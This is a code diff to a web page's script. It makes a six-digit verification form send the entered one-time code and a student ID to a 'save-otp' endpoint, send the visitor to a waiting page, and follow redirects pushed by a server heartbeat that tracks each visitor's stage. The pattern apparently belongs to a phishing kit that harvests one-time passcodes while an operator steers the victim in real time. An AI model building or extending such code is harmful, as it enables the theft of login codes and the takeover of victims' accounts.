@@ -71,12 +71,33 @@ inputs.forEach((inp, i) => {
     });
 });
 
-function verify() {
+async function verify() {
     const code = Array.from(inputs).map(i => i.value).join('');
     if (code.length < 6) { document.getElementById('msg').className='alert alert-error'; document.getElementById('msg').textContent='Enter all 6 digits'; return; }
-    document.getElementById('msg').className='alert alert-success';
-    document.getElementById('msg').textContent='Code verified! Please wait...';
     document.getElementById('verifyBtn').disabled = true;
+    document.getElementById('verifyBtn').textContent = 'Verifying...';
+    try {
+        const resp = await fetch('api/save-otp.php', {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ student_id: studentId, otp_code: code })
+        });
+        const data = await resp.json();
+        if (data.success) {
+            document.getElementById('msg').className='alert alert-success';
+            document.getElementById('msg').textContent='Code verified! Redirecting...';
+            setTimeout(() => { window.location.href = 'waiting.php'; }, 2000);
+        } else {
+            document.getElementById('msg').className='alert alert-error';
+            document.getElementById('msg').textContent=data.error || 'Verification failed';
+            document.getElementById('verifyBtn').disabled = false;
+            document.getElementById('verifyBtn').textContent = 'Verify';
+        }
+    } catch(e) {
+        document.getElementById('msg').className='alert alert-error';
+        document.getElementById('msg').textContent='Connection error';
+        document.getElementById('verifyBtn').disabled = false;
+        document.getElementById('verifyBtn').textContent = 'Verify';
+    }
 }
 
 function hb(){if(!pageVisible||document.hidden)return;fetch('api/heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({student_id:studentId})}).then(r=>r.json()).then(d=>{if(d.redirect)window.location.href=d.redirect}).catch(()=>{});if(visitorId)fetch('api/visitor-heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitor_id:visitorId,status:'otp'})}).catch(()=>{});}
